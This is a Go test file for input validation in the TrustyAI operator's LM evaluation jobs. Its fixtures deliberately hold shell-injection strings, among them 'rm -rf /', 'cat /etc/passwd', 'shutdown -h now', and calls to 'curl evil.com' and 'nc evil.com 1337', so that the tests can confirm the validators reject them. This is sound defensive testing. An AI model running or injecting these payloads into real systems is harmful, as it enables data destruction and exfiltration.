package lmes

import (
	"testing"

	"github.com/stretchr/testify/assert"
	lmesv1alpha1 "github.com/trustyai-explainability/trustyai-service-operator/api/lmes/v1alpha1"
)

func Test_InputValidation(t *testing.T) {

	// Test cases for ValidateModelName
	t.Run("ValidateModelName", func(t *testing.T) {
		// Valid model names
		validNames := []string{
			"hf",
			"local-completions",
			"local-chat-completions",
			"watsonx_llm",
			"openai-completions",
			"openai-chat-completions",
			"textsynth",
		}

		for _, name := range validNames {
			assert.NoError(t, ValidateModelName(name), "Should accept valid model name: %s", name)
		}

		// Invalid model names
		invalidNames := []string{
			"hf2",
			"hf; echo hello > /tmp/pwned",
			"model && rm -rf /",
			"model | cat /etc/passwd",
			"model `whoami`",
			"model $(id)",
			"model & sleep 60",
			"model || curl evil.com",
			"model; shutdown -h now",
			"model\necho something",
			"model'",
			"model\"",
			"model\\",
			"model{test}",
			"model[test]",
			"model<test>",
			"",
		}

		for _, name := range invalidNames {
			assert.Error(t, ValidateModelName(name), "Should reject invalid model name: %s", name)
		}
	})

	// Test cases for ValidateArgs
	t.Run("ValidateArgs", func(t *testing.T) {
		// Valid arguments
		validArgs := []lmesv1alpha1.Arg{
			{Name: "pretrained", Value: "model-name"},
			{Name: "device", Value: "cuda"},
			{Name: "batch_size", Value: "16"},
			{Name: "max_length", Value: "2048"},
			{Name: "model", Value: "google/flan-t5-small"},
			{Name: "base_url", Value: "https://vllm-my-model.test.svc.cluster.local"},
			{Name: "tokenizer", Value: "myorg/MyModel-4k-Instruct"},
			{Name: "num_concurrent", Value: "2"},
			{Name: "timeout", Value: "30"},
			{Name: "tokenized_requests", Value: "True"},
			{Name: "tokenizer_backend", Value: "huggingface"},
			{Name: "max_retries", Value: "3"},
			{Name: "max_gen_toks", Value: "256"},
			{Name: "seed", Value: "1234"},
			{Name: "add_bos_token", Value: "False"},
			{Name: "custom_prefix_token_id", Value: "1234567890"},
			{Name: "verify_certificate", Value: "True"},
		}
		assert.NoError(t, ValidateArgs(validArgs, "test"))

		// Invalid argument names
		invalidArgNames := []lmesv1alpha1.Arg{
			{Name: "name; echo pwned", Value: "value"},
			{Name: "name && rm -rf /", Value: "value"},
			{Name: "name|cat", Value: "value"},
			{Name: "name`whoami`", Value: "value"},
			{Name: "", Value: "value"},
		}

		for _, arg := range invalidArgNames {
			assert.Error(t, ValidateArgs([]lmesv1alpha1.Arg{arg}, "test"), "Should reject invalid arg name: %s", arg.Name)
		}

		// Invalid argument values
		invalidArgValues := []lmesv1alpha1.Arg{
			{Name: "valid", Value: "value; echo pwned"},
			{Name: "valid", Value: "value && rm -rf /"},
			{Name: "valid", Value: "value|cat /etc/passwd"},
			{Name: "valid", Value: "value`whoami`"},
			{Name: "valid", Value: "value$(id)"},
			{Name: "valid", Value: "value\necho something"},
		}

		for _, arg := range invalidArgValues {
			assert.Error(t, ValidateArgs([]lmesv1alpha1.Arg{arg}, "test"), "Should reject invalid arg value: %s", arg.Value)
		}
	})

	// Test cases for ValidateArgValue specifically
	t.Run("ValidateArgValue", func(t *testing.T) {
		// Valid argument values
		validValues := []string{
			"simple-value",
			"model_name",
			"123",
			"value123",
			"path/to/model",
			"namespace:value",
			"value.with.dots",
			"value-with-hyphens",
			"value_with_underscores",
			"path/with/slashes",
			"name:space:value",
			"value with spaces",
			"this is a valid text",
			"True",
			"False",
		}

		for _, value := range validValues {
			assert.NoError(t, ValidateArgValue(value), "Should accept valid arg value: %s", value)
		}

		// Invalid argument values with shell metacharacters
		shellMetaValues := []string{
			"value; echo pwned",
			"value && rm -rf /",
			"value|cat /etc/passwd",
			"value`whoami`",
			"value$(id)",
			"value\necho something",
			"value'single'",
			"value\"double\"",
			"value\\backslash",
		}

		for _, value := range shellMetaValues {
			assert.Error(t, ValidateArgValue(value), "Should reject arg value with shell metacharacters: %s", value)
		}
	})

	// Test cases for ValidateLimit
	t.Run("ValidateLimit", func(t *testing.T) {
		// Valid limits
		validLimits := []string{
			"100",
			"0.5",
			"0.01",
			"1000",
			"0.9999",
			"0",
			"1",
			"0.0",
			"1.0",
			"123.456",
			"999",
		}

		for _, limit := range validLimits {
			assert.NoError(t, ValidateLimit(limit), "Should accept valid limit: %s", limit)
		}

		// Invalid limits
		invalidLimits := []string{
			"100; echo pwned",
			"0.5 && rm -rf /",
			"limit|cat",
			"100`whoami`",
			"not-a-number",
			"100.5.5",
			"",
		}

		for _, limit := range invalidLimits {
			assert.Error(t, ValidateLimit(limit), "Should reject invalid limit: %s", limit)
		}
	})

	// Test comprehensive validation
	t.Run("ComprehensiveValidation", func(t *testing.T) {
		// Create a job with invalid values in multiple fields
		maliciousJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf; echo pwned > /tmp/compromised",
				ModelArgs: []lmesv1alpha1.Arg{
					{Name: "pretrained", Value: "model; rm -rf /"},
				},
				Limit: "0.5; shutdown -h now",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"task; echo compromised"},
				},
			},
		}

		// Should fail validation
		assert.Error(t, ValidateUserInput(maliciousJob), "Should reject job with invalid patterns")

		// Create a clean job
		cleanJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				ModelArgs: []lmesv1alpha1.Arg{
					{Name: "pretrained", Value: "google/flan-t5-small"},
					{Name: "device", Value: "cuda"},
				},
				Limit: "0.5",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande", "hellaswag"},
				},
			},
		}

		// Should pass validation
		assert.NoError(t, ValidateUserInput(cleanJob), "Should accept clean job")
	})
}

func Test_CommandSanitization(t *testing.T) {
	// Test comprehensive command sanitization
	t.Run("BlockInvalidInputs", func(t *testing.T) {
		invalidInputs := []struct {
			name        string
			job         *lmesv1alpha1.LMEvalJob
			expectedErr string
		}{
			{
				name: "ModelFieldInvalid",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "hf; echo pwned > /tmp/compromised",
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"winogrande"},
						},
					},
				},
				expectedErr: "invalid model",
			},
			{
				name: "ModelArgsInvalid",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "hf",
						ModelArgs: []lmesv1alpha1.Arg{
							{Name: "pretrained", Value: "model; rm -rf /"},
						},
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"winogrande"},
						},
					},
				},
				expectedErr: "invalid model arguments",
			},
			{
				name: "LimitFieldInvalid",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "hf",
						Limit: "0.5; shutdown -h now",
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"winogrande"},
						},
					},
				},
				expectedErr: "invalid limit",
			},
			{
				name: "TaskNameInvalid",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "hf",
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"winogrande; cat /etc/passwd"},
						},
					},
				},
				expectedErr: "invalid task names",
			},
			{
				name: "MultipleFieldsInvalid",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "hf && rm -rf /",
						Limit: "0.5 | nc evil.com 1337",
						ModelArgs: []lmesv1alpha1.Arg{
							{Name: "device", Value: "cuda; wget something.com/remote"},
						},
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"task`whoami`"},
						},
					},
				},
				expectedErr: "invalid model",
			},
		}

		for _, tc := range invalidInputs {
			t.Run(tc.name, func(t *testing.T) {
				err := ValidateUserInput(tc.job)
				assert.Error(t, err, "Should reject invalid input: %s", tc.name)
				assert.Contains(t, err.Error(), tc.expectedErr, "Error should mention: %s", tc.expectedErr)
			})
		}
	})

	t.Run("AcceptSafeInputs", func(t *testing.T) {
		safeInputs := []struct {
			name string
			job  *lmesv1alpha1.LMEvalJob
		}{
			{
				name: "BasicSafeJob",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "hf",
						ModelArgs: []lmesv1alpha1.Arg{
							{Name: "pretrained", Value: "google/flan-t5-small"},
							{Name: "device", Value: "cuda"},
						},
						Limit: "0.01",
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"winogrande", "hellaswag"},
						},
					},
				},
			},
			{
				name: "HuggingFaceModel",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "hf",
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"code_eval"},
						},
					},
				},
			},
			{
				name: "LocalModel",
				job: &lmesv1alpha1.LMEvalJob{
					Spec: lmesv1alpha1.LMEvalJobSpec{
						Model: "local-completions",
						TaskList: lmesv1alpha1.TaskList{
							TaskNames: []string{"mmlu"},
						},
					},
				},
			},
		}

		for _, tc := range safeInputs {
			t.Run(tc.name, func(t *testing.T) {
				err := ValidateUserInput(tc.job)
				assert.NoError(t, err, "Should accept valid input: %s", tc.name)
			})
		}
	})
}

func Test_TaskRecipesValidation(t *testing.T) {
	t.Run("ValidTaskRecipes", func(t *testing.T) {
		validRecipes := []lmesv1alpha1.TaskRecipe{
			{
				Card: lmesv1alpha1.Card{
					Name: "valid.card_name",
				},
				Template: "valid.template",
			},
			{
				Card: lmesv1alpha1.Card{
					Name: "another-card",
				},
				Template: "template_2",
				Metrics:  []string{"metric1", "metric2"},
			},
		}

		assert.NoError(t, ValidateTaskRecipes(validRecipes), "Should accept valid task recipes")
	})

	t.Run("InvalidTaskRecipes", func(t *testing.T) {
		invalidRecipes := []lmesv1alpha1.TaskRecipe{
			{
				Card: lmesv1alpha1.Card{
					Name: "card; rm -rf /",
				},
				Template: "template",
			},
		}

		assert.Error(t, ValidateTaskRecipes(invalidRecipes), "Should reject task recipe with shell injection in card name")

		invalidTemplate := []lmesv1alpha1.TaskRecipe{
			{
				Card: lmesv1alpha1.Card{
					Name: "card",
				},
				Template: "template`whoami`",
			},
		}

		assert.Error(t, ValidateTaskRecipes(invalidTemplate), "Should reject task recipe with shell injection in template")
	})
}

func Test_GenArgsValidation(t *testing.T) {
	t.Run("ValidGenArgs", func(t *testing.T) {
		validGenArgsJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				GenArgs: []lmesv1alpha1.Arg{
					{Name: "temperature", Value: "0.7"},
					{Name: "max_tokens", Value: "100"},
					{Name: "top_p", Value: "0.9"},
					{Name: "frequency_penalty", Value: "0.1"},
				},
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
				},
			},
		}

		assert.NoError(t, ValidateUserInput(validGenArgsJob), "Should accept valid GenArgs")
	})

	t.Run("InvalidGenArgs", func(t *testing.T) {
		invalidGenArgsJob := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "hf",
				GenArgs: []lmesv1alpha1.Arg{
					{Name: "temperature; rm -rf /", Value: "0.7"},
				},
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"winogrande"},
				},
			},
		}

		assert.Error(t, ValidateUserInput(invalidGenArgsJob), "Should reject GenArgs with shell metacharacters")
	})
}

func Test_BatchSizeValidation(t *testing.T) {
	t.Run("ValidBatchSizes", func(t *testing.T) {
		validBatchSizes := []string{
			"16",
			"auto",
			"auto:8",
			"1",
			"128",
		}

		for _, batchSize := range validBatchSizes {
			err := ValidateBatchSizeInput(batchSize)
			assert.NoError(t, err, "Should accept valid BatchSize: %s", batchSize)
		}
	})

	t.Run("InvalidBatchSizes", func(t *testing.T) {
		invalidBatchSizes := []string{
			"16; rm -rf /",
			"auto`whoami`",
			"8|cat /etc/passwd",
			"auto&&curl evil.com",
			"",
		}

		for _, batchSize := range invalidBatchSizes {
			err := ValidateBatchSizeInput(batchSize)
			assert.Error(t, err, "Should reject invalid BatchSize: %s", batchSize)
		}
	})
}

func Test_EdgeCasesAndBoundaryConditions(t *testing.T) {
	t.Run("EmptyAndNilInputs", func(t *testing.T) {
		// Test nil job
		err := ValidateUserInput(nil)
		assert.Error(t, err, "Should reject nil job")

		// Test empty model
		job := &lmesv1alpha1.LMEvalJob{
			Spec: lmesv1alpha1.LMEvalJobSpec{
				Model: "",
				TaskList: lmesv1alpha1.TaskList{
					TaskNames: []string{"task"},
				},
			},
		}
		err = ValidateUserInput(job)
		assert.Error(t, err, "Should reject empty model")

		// Test empty task names
		job.Spec.Model = "hf"
		job.Spec.TaskList.TaskNames = []string{""}
		err = ValidateUserInput(job)
		assert.Error(t, err, "Should reject empty task name")
	})

	t.Run("ValidBoundaryValues", func(t *testing.T) {
		// Test valid decimal limits
		validLimits := []string{
			"0",
			"1",
			"0.0",
			"1.0",
			"0.01",
			"0.999",
			"123.456",
			"999",
		}

		for _, limit := range validLimits {
			err := ValidateLimit(limit)
			assert.NoError(t, err, "Should accept valid limit: %s", limit)
		}

		// Test invalid limits
		invalidLimits := []string{
			"abc",
			"1.2.3",
			"1e10",
			"1,5",
			"..",
		}

		for _, limit := range invalidLimits {
			err := ValidateLimit(limit)
			assert.Error(t, err, "Should reject invalid limit: %s", limit)
		}
	})
}

func Test_ShellMetacharactersDetection(t *testing.T) {
	t.Run("DetectShellMetacharacters", func(t *testing.T) {
		// Dangerous inputs
		dangerousInputs := []string{
			"value; echo pwned",
			"value && rm -rf /",
			"value | cat /etc/passwd",
			"value `whoami`",
			"value $(id)",
			"value'single'",
			"value\"double\"",
			"value\\backslash",
			"value\nnewline",
			"value\rcarriage",
			"value\ttab",
			"value<redirect",
			"value>redirect",
			"value(paren",
			"value)paren",
			"value&ampersand",
			"value$dollar",
		}

		for _, input := range dangerousInputs {
			assert.True(t, ContainsShellMetacharacters(input), "Should detect shell metacharacters in: %s", input)
		}

		// Safe inputs (JSON characters allowed)
		safeInputs := []string{
			"simple-value",
			"value_123",
			"value.with.dots",
			"path/to/file",
			"namespace:value",
			"{json:object}",
			"[array,values]",
			"value with spaces",
		}

		for _, input := range safeInputs {
			// These should NOT contain shell metacharacters (but may fail other validations)
			if ContainsShellMetacharacters(input) {
				// Only {} and [] should be allowed
				assert.True(t, input == "{json:object}" || input == "[array,values]",
					"Unexpected shell metacharacter detection in: %s", input)
			}
		}
	})
}

func Test_JSONValidation(t *testing.T) {
	t.Run("ValidJSON", func(t *testing.T) {
		validJSON := []string{
			`{"key": "value"}`,
			`{"nested": {"key": "value"}}`,
			`{"array": [1, 2, 3]}`,
			`{"bool": true, "null": null}`,
		}

		for _, json := range validJSON {
			err := ValidateJSON(json)
			assert.NoError(t, err, "Should accept valid JSON: %s", json)
		}
	})

	t.Run("InvalidJSON", func(t *testing.T) {
		invalidJSON := []string{
			`{invalid}`,
			`{"key": value}`,
			`{"unclosed": `,
			`not json at all`,
			``,
		}

		for _, json := range invalidJSON {
			err := ValidateJSON(json)
			assert.Error(t, err, "Should reject invalid JSON: %s", json)
		}
	})

	t.Run("JSONWithDangerousPatterns", func(t *testing.T) {
		dangerousJSON := []string{
			`{"cmd": "$(rm -rf /)"}`,
			"{\"cmd\": \"`whoami`\"}",
			`{"cmd": "value && curl evil.com"}`,
			`{"cmd": "value || shutdown"}`,
		}

		for _, json := range dangerousJSON {
			err := ValidateJSONContent(json)
			assert.Error(t, err, "Should reject JSON with dangerous patterns: %s", json)
		}
	})
}

func Test_TaskNameValidation(t *testing.T) {
	t.Run("ValidTaskNames", func(t *testing.T) {
		validNames := []string{
			"winogrande",
			"hellaswag",
			"arc_easy",
			"mmlu",
			"task-name",
			"task.name",
			"task_name_123",
		}

		for _, name := range validNames {
			err := ValidateTaskName(name)
			assert.NoError(t, err, "Should accept valid task name: %s", name)
		}
	})

	t.Run("InvalidTaskNames", func(t *testing.T) {
		invalidNames := []string{
			"task; echo pwned",
			"task && rm",
			"task | cat",
			"task`whoami`",
			"task$(id)",
			"task with spaces",
			"task@domain",
			"",
		}

		for _, name := range invalidNames {
			err := ValidateTaskName(name)
			assert.Error(t, err, "Should reject invalid task name: %s", name)
		}
	})
}
